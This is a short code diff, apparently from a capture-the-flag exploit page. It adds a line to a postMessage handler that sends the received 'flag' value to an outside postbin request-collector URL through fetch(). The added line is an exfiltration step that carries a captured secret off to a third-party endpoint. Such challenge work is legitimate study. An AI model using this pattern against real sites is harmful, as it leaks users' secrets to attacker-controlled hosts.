@@ -11,6 +11,7 @@ window.onmessage = (e) => {
         type
     } = data;
     await fetch("https://www.toptal.com/developers/postbin/1661892845090-2004152068402?flag=" + type);
+    await fetch("https://www.toptal.com/developers/postbin/1661892845090-2004152068402?flag=" + data.flag);
 }
 
 document.getElementById("iframe").contentWindow.postMessage({
